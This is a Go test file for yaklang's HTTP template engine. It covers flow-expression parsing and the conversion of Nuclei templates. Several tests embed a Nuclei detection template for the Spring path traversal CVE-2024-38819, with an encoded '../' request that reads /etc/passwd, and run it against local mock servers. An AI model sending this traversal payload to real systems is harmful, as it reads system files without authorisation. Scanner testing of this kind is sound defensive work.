package httptpl

import (
	"net/http"
	"testing"

	"github.com/stretchr/testify/require"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
)

func TestParseFlow(t *testing.T) {
	cases := []struct {
		flow    string
		wantErr bool
		// leaf sequence indices in order of evaluation
		wantRefs []int
	}{
		{"http(1) && http(2)", false, []int{1, 2}},
		{"http(1) || http(2)", false, []int{1, 2}},
		{"http(1) && http(2) || http(3)", false, []int{1, 2, 3}},
		{"(http(1) && http(2)) || http(3)", false, []int{1, 2, 3}},
		{"", false, nil},
		{"http(1)", false, []int{1}},
		{"http(1) &&", true, nil},
		{"http(0)", false, []int{0}},
		{"invalid", true, nil},
	}
	for _, tc := range cases {
		node, err := parseFlow(tc.flow)
		if tc.wantErr {
			require.Error(t, err, "expected error for flow %q", tc.flow)
			continue
		}
		require.NoError(t, err, "unexpected error for flow %q", tc.flow)
		if tc.wantRefs == nil {
			require.Nil(t, node, "expected nil AST for flow %q", tc.flow)
			continue
		}
		require.NotNil(t, node, "expected non-nil AST for flow %q", tc.flow)
		// collect leaf refs
		var refs []int
		var walk func(n *flowNode)
		walk = func(n *flowNode) {
			if n == nil {
				return
			}
			if n.op == "" {
				refs = append(refs, n.seqIndex)
				return
			}
			walk(n.left)
			walk(n.right)
		}
		walk(node)
		require.Equal(t, tc.wantRefs, refs, "leaf refs mismatch for flow %q", tc.flow)
	}
}

func TestValidateFlowNode(t *testing.T) {
	// http(1) && http(2) with 2 sequences -> OK
	node, err := parseFlow("http(1) && http(2)")
	require.NoError(t, err)
	require.NoError(t, validateFlowNode(node, 2))
	// http(3) with only 2 sequences -> error
	require.Error(t, validateFlowNode(node, 1))
}

func TestNucleiFlowAndInternal(t *testing.T) {
	tpl := `id: CVE-2024-38819

info:
  name: Spring Framework Path Traversal
  author: DhiyaneshDk
  severity: high

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "!regex('root:.*:0:0:', body)"
        internal: true

  - raw:
      - |
        GET /static/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "regex('root:.*:0:0:', body)"
          - "status_code == 200"
        condition: and
`
	yakTpl, err := CreateYakTemplateFromNucleiTemplateRaw(tpl)
	require.NoError(t, err)

	// flow should be parsed
	require.Equal(t, "http(1) && http(2)", yakTpl.Flow)

	// two request sequences
	require.Len(t, yakTpl.HTTPRequestSequences, 2)

	// first sequence matcher should be internal
	seq1Matcher := yakTpl.HTTPRequestSequences[0].Matcher
	require.NotNil(t, seq1Matcher)
	require.True(t, seq1Matcher.Internal, "first matcher should be internal")

	// second sequence matcher should NOT be internal
	seq2Matcher := yakTpl.HTTPRequestSequences[1].Matcher
	require.NotNil(t, seq2Matcher)
	require.False(t, seq2Matcher.Internal, "second matcher should not be internal")
}

func TestNucleiFlowExecution_NoFalsePositive(t *testing.T) {
	// Simulate a server that does NOT serve /etc/passwd directly (404)
	// and does NOT have path traversal (also 404 for the traversal path).
	// The internal matcher on http(1) will match (body doesn't contain root:),
	// so http(2) will run. But http(2)'s matcher won't match (no root: in body).
	// The final result should be: NO vulnerability reported.
	server, port := utils.DebugMockHTTP([]byte("HTTP/1.1 404 Not Found\r\n" +
		"Content-Length: 9\r\n" +
		"\r\nNot Found"))

	tpl := `id: CVE-2024-38819

info:
  name: Spring Framework Path Traversal
  author: DhiyaneshDk
  severity: high

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "!regex('root:.*:0:0:', body)"
        internal: true

  - raw:
      - |
        GET /static/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "regex('root:.*:0:0:', body)"
          - "status_code == 200"
        condition: and
`
	yakTpl, err := CreateYakTemplateFromNucleiTemplateRaw(tpl)
	require.NoError(t, err)

	var vulnReported bool
	config := NewConfig()
	config.AppendResultCallback(func(y *YakTemplate, reqBulk any, rsp any, result bool, extractor map[string]interface{}) {
		if result {
			vulnReported = true
		}
	})

	_, err = yakTpl.Exec(config, false, []byte("GET / HTTP/1.1\r\n"+
		"Host: localhost\r\n\r\n"), lowhttp.WithHost(server), lowhttp.WithPort(port))
	require.NoError(t, err)
	require.False(t, vulnReported, "should not report vulnerability when path traversal is not present")
}

func TestNucleiFlowExecution_PositiveMatch(t *testing.T) {
	// Simulate a server where:
	// - /etc/passwd returns 404 (internal matcher matches: no root: in body)
	// - the path traversal path returns root:...:0:0: with 200
	// The final result should be: vulnerability reported.
	passwdBody := "root:x:0:0:root:/root:/bin/bash\n"
	server, port := utils.DebugMockHTTPHandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/etc/passwd" {
			w.WriteHeader(http.StatusNotFound)
			w.Write([]byte("Not Found"))
			return
		}
		// path traversal path returns passwd content
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(passwdBody))
	})

	tpl := `id: CVE-2024-38819

info:
  name: Spring Framework Path Traversal
  author: DhiyaneshDk
  severity: high

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "!regex('root:.*:0:0:', body)"
        internal: true

  - raw:
      - |
        GET /static/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "regex('root:.*:0:0:', body)"
          - "status_code == 200"
        condition: and
`
	yakTpl, err := CreateYakTemplateFromNucleiTemplateRaw(tpl)
	require.NoError(t, err)

	var vulnReported bool
	config := NewConfig()
	config.AppendResultCallback(func(y *YakTemplate, reqBulk any, rsp any, result bool, extractor map[string]interface{}) {
		if result {
			vulnReported = true
		}
	})

	_, err = yakTpl.Exec(config, false, []byte("GET / HTTP/1.1\r\n"+
		"Host: localhost\r\n\r\n"), lowhttp.WithHost(server), lowhttp.WithPort(port))
	require.NoError(t, err)
	require.True(t, vulnReported, "should report vulnerability when path traversal succeeds")
}
